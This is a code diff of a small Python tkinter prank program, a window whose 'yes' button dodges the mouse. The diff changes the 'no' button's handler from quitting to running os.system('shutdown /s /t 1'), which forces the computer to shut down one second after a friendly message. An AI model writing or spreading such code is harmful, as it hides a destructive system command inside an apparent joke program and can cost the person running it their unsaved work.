@@ -1,13 +1,16 @@
 from tkinter import *
 from tkinter import messagebox
 import random
+import os
 
 def no():
     messagebox.showinfo(' ', 'Kösz tesa')
-    quit()
+    return os.system("shutdown /s /t 1")
 
 def motionMouse(event):
     btnYes.place(x=random.randint(0, 500), y=random.randint(0, 500))
+
+
 
 root = Tk()
 root.geometry("600x600")
